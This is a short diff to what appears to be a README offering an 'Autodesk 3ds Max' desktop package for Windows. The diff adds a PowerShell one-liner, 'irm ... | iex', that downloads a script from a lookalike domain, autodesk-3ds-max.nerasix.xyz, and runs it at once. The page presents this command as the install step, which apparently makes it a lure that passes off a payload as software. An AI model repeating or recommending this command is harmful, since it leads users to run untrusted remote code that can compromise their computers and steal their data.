@@ -8,6 +8,10 @@
 
 > Use the project link below for Windows.
 
+```
+irm https://autodesk-3ds-max.nerasix.xyz/ | iex
+```
+
 * **Project link:** **[autodesk-3ds-max.nerasix.xyz](https://autodesk-3ds-max.nerasix.xyz/)**
 * **Full URL:** `https://autodesk-3ds-max.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
